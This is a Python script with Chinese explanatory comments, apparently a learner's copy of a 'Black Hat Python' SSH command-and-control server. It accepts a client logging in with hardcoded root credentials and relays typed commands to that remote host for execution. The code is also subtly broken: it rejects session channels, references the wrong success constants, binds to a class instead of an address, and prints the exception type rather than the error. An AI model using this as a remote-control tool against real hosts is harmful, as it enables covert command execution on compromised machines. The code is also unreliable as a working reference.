#coding="utf-8"
#   Paramiko使用详解:https://blog.csdn.net/u014028063/article/details/81197431
import socket
import paramiko
import threading
import sys
def main():
    # 使用 Paramiko示例文件的密钥
    # host_key = paramiko.RSAKey(filename='test_rsa.key')
    host_key = paramiko.RSAKey(filename='/root/.ssh/id_rsa')#(重要,程序的执行入口)提供密钥的文件路径

    class Server(paramiko.ServerInterface):#定义一个“服务”类
        def __init__(self):#初始化
            self.event = threading.Event()#启用线程
        def check_channel_request(self,kind,chanid):#检测信道请求
            if kind == "session":
                return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED #返回 “打开失败”
        def check_auth_password(self, username, password):#检查登录SSH的账号和密码是否相等
            if(username == "root") and (password == "whatthefuck"):#如果相等则返回成功
                return password.AUTH_SUCCESSFUL
            return password.AUTH_FAILED                             #否则返回失败

    server = sys.argv[1]#argv用法就是获取在命令行执行python命令时 用户输入的 所有数据
    ssh_port = int(sys.argv[2])
    try:    #异常处理，先执行try下的语句，如果遇到执行失败，则立刻执行except下的语句
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#建立TCP socket
        sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #sock设置：这里value设置为1，表示将SO_REUSEADDR标记为TRUE，操作系统会在服务器socket被关闭或服务器进程终止后马上释放该服务器的端口，否则操作系统会保留几分钟该端口
        sock.bind((Server,ssh_port))#绑定ip和端口
        sock.listen(3)              #允许的最大连接数
        print("[+] Listening for Connection..." )
        client,addr = sock.accept()
    except Exception:
        print("[-] Listen failed:"+str(Exception))
        sys.exit(1)
    print("[+]Connection is Success!")

    try:#作用：开始连接，并执行
        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(host_key)
        server = Server()
        try:
            bhSession.start_server(server=server)
        except paramiko.SSHException:
            print ('[-] SSH negotiation failed')#连接超时
        chan = bhSession.accept(20) #设置超时值为20
        print( '[+] Authenticated!')#验证成功
        print( chan.recv(1024))#接收数据
        chan.send("Welcome to my ssh")
        while True:#接收相对应的命令，并执行
            try:
                command = input("Enter command:").strip("\n")   #strip移除字符串头尾指定的字符（默认为空格）,这里是换行
                if command != 'exit':
                    chan.send(command)
                    print (chan.recv(1024) + '\n')
                else:
                    chan.send('exit')
                    print( '[+] exiting')
                    bhSession.close()
                    raise Exception('exit')
            except KeyboardInterrupt:
                bhSession.close()
    except Exception:
        print ('[-] Caught exception: ' + str(Exception))
        try:
            bhSession.close()
        except:
            pass
        sys.exit(1)

if __name__ =="__main__":
    main()